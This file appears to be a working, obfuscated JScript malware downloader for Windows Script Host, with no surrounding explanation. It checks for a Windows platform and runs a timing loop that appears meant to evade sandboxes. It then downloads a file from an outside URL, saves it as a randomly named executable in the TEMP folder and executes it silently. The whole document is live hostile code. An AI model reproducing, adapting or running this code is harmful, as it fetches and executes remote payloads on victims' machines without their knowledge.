var _N = false;
var _QL = "CreateObject";
var _KR = function _LJ() {return WScript[_QL]("WScript"+".Shell");}(), _R0 = 11;
var _KI = "MSXML2.XMLHTTP";
var _HN = 2123213;
var _IN = 0;
function _UQ(_LB){_KR["Run"](_LB, _IN, _IN);};
function _V(){return _KI + "";};
function _L(_UL, _QS){_IN = _IN * 1; return _UL - _QS;};
function _R(){return _QL;};
/*@cc_on
  @if (@_win32 || @_win64)
    _N = true;
  @end
@*/
if (_N)
{
var _SR = "";
function _Z(){return 22;};
var _HM = 0; var _ZQ = 0;
function _H()
{
var _S = new this["Date"]();
var _V0 = _S["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _S = new this["Date"]();
var _G0 = _S["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _S = new this["Date"]();
var _US = _S["getUTCMilliseconds"]();
var _HM = "_QW";
_HM = _L(_G0, _V0);
var _ZQ = "_G";
_ZQ = _L(_US, _G0);
_SR = "open";
return _L(_HM, _ZQ);
}
var _R1 = false;
var _L0 = false;
for (var _UE = _IN; _UE < _Z() * 1; _UE++){if (_H() != _IN){
_R1 = true; 
_ZQ = "31" + 11 * _HM + _ZQ; 
_L0 = true; 
break;
}}
function _FQ() {return ((_R1 == true) && (_R1 == _L0)) ? 1 : _IN;};
if (_R1 && _FQ() && _L0){
function _YE() {return _KR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "eSZdDJzVokZ8Y.ex" + "e";};
 _ZD = _V();
 _J = WScript[_QL](_ZD);
 var _P = 1;
 while (_P){
try {
	if (_P == 1)
	{
		_J[_SR]("GET", "http://bqsc.pt/c6ska", false);
		_J["send"]();
		_UU = "Sleep";
	}
	WScript[_UU](_Z() + 120); 
	if (_J["readystate"] < 2 * 2) continue;
	_P = _IN;
	function _RT(_M) {var _JO = (1, 2, 3, 4, 5, _M); return _JO;};
	_IZ = WScript[_R()]("ADODB.Stream");
	_ZD = _IZ;
	_ZD[_SR]();
	_ZD["type"] = _RT(1);
	_ZD["write"](_J["ResponseBody"]);
	_IZ["position"] = _RT(_IN);
	_ZD["Save" + "ToFile"](_YE(), 2);
	_IZ["cl"+"ose"]();
	_T = _YE();
	_UQ(_T);
} catch(_TN){};
}
}
}

